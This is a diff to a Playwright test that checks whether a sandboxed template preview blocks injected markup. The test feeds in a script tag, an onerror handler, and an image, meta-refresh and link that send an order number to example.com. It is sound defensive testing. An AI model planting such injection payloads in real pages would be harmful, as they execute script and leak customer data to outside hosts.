@@ -40,7 +40,7 @@ test("the preview is sandboxed with scripts disabled and a content security poli
   }
 });
 
-test("the sandbox refuses a script injected into the template", async ({ page }) => {
+test("the preview refuses scripts, remote loads, refreshes and link clicks injected into the template", async ({ page }) => {
   // Requests the browser actually completed to anywhere but the app itself (CSP-blocked ones fail instead).
   const outbound: string[] = [];
   page.on("requestfinished", (req) => {
@@ -57,7 +57,14 @@ test("the sandbox refuses a script injected into the template", async ({ page })
     `<script>document.body.setAttribute("data-pwned", "script"); parent.document.title = "pwned";</script>`,
     `<img src="data:," onerror="document.body.setAttribute('data-pwned', 'handler')">`,
     `<img id="leak" src="https://example.com/leak.png?order=1003">`,
+    `<meta http-equiv="refresh" content="0; url=https://example.com/refresh?order=1003">`,
+    `<a id="exfil" href="https://example.com/link?order=1003">Track your order</a>`,
   ].join("");
+  // Navigations a link or refresh would start, whether or not they'd complete.
+  const navigations: string[] = [];
+  page.on("request", (req) => {
+    if (req.url().startsWith("https://example.com/") && req.isNavigationRequest()) navigations.push(req.url());
+  });
   await page.locator(preview).evaluate((iframe: HTMLIFrameElement, markup) => {
     iframe.srcdoc = iframe.srcdoc.replace("</body>", `${markup}</body>`);
   }, hostile);
@@ -65,8 +72,13 @@ test("the sandbox refuses a script injected into the template", async ({ page })
   const slip = page.frameLocator(preview);
   await expect(slip.locator("#leak")).toBeAttached();
   await expect(slip.getByText("Order #1003")).toBeVisible();
-  // Give any script, handler or request a moment to run if it were going to.
+  // The seller clicks a link a hijacked edit planted: the preview must stay put.
+  await slip.locator("#exfil").click();
+  // Give any script, handler, refresh or request a moment to run if it were going to.
   await page.waitForTimeout(500);
+
+  await expect(slip.getByText("Order #1003")).toBeVisible();
+  expect(navigations).toEqual([]);
 
   await expect(slip.locator("body")).not.toHaveAttribute("data-pwned");
   expect(await page.title()).toBe(titleBefore);
